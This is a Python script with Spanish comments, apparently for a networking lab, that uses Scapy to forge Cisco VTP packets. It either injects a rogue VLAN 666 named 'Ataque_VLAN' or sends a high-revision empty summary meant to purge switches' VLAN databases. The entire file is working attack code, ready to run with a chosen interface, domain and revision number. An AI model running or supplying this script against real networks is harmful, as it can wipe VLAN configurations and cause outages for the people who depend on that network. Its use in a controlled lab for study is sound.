#!/usr/bin/env python3
import sys
from scapy.all import *

# Asegurar que las capas VTP estén disponibles en Scapy
load_contrib("vtp")

def vtp_attack(interface, domain, revision, action, vlan_id=None, vlan_name=None):
    print(f"[*] Iniciando ataque VTP en interfaz {interface}...")
    print(f"[*] Dominio VTP: {domain} | Revisión: {revision}")
    
    # 1. Construir la cabecera base (Destino común de Cisco de capa 2)
    ether = Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(interface))
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    snap = SNAP(OUI=0x00000c, code=0x2001)
    
    if action == "crear":
        print(f"[*] Intentando AGREGAR la VLAN {vlan_id} ({vlan_name})...")
        # Mensaje de resumen indicando que hay una actualización
        vtp_summary = VTPHeader(type=1, followers=1, md5=b"\x00"*16, 
                                domain=domain, rev=revision)
        
        # Mensaje subset que contiene la información de la nueva VLAN
        vtp_vlan_info = VTPVLANInfo(vlan_id=vlan_id, type=1, name_len=len(vlan_name), name=vlan_name)
        vtp_subset = VTPHeader(type=2, seq=1, domain=domain, rev=revision) / vtp_vlan_info
        
        # Enviar paquete combinado
        packet = ether / llc / snap / vtp_summary / vtp_subset
        sendp(packet, iface=interface, verbose=False)
        print("[+] Paquete VTP enviado exitosamente.")

    elif action == "borrar":
        print("[*] Intentando BORRAR VLANs (Enviando revisión alta vacía)...")
        # Al enviar una revisión más alta pero sin seguidores (followers=0) ni información de VLANs,
        # los switches secundarios podrían purgar o desincronizar sus bases de datos no guardadas.
        vtp_summary = VTPHeader(type=1, followers=0, md5=b"\x00"*16, 
                                domain=domain, rev=revision)
        
        packet = ether / llc / snap / vtp_summary
        sendp(packet, iface=interface, verbose=False)
        print("[+] Paquete VTP de purga enviado exitosamente.")

if __name__ == "__main__":
    # Parámetros configurables para tu laboratorio
    INTERFACE = "eth0"
    VTP_DOMAIN = "ITLA"       # Debe coincidir con el configurado en tu switch
    REVISION_ALTA = 100       # Debe ser mayor al "Configuration Revision" actual del switch
    
    print("--- MENU LABORATÓRIO VTP ---")
    print("1. Agregar VLAN 666 (Ataque_VLAN)")
    print("2. Borrar/Purgar VLANs")
    opcion = input("Seleccione una opción: ")
    
    if opcion == "1":
        vtp_attack(INTERFACE, VTP_DOMAIN, REVISION_ALTA, "crear", vlan_id=666, vlan_name="Ataque_VLAN")
    elif opcion == "2":
        vtp_attack(INTERFACE, VTP_DOMAIN, REVISION_ALTA + 5, "borrar")
    else:
        print("Opción inválida.")
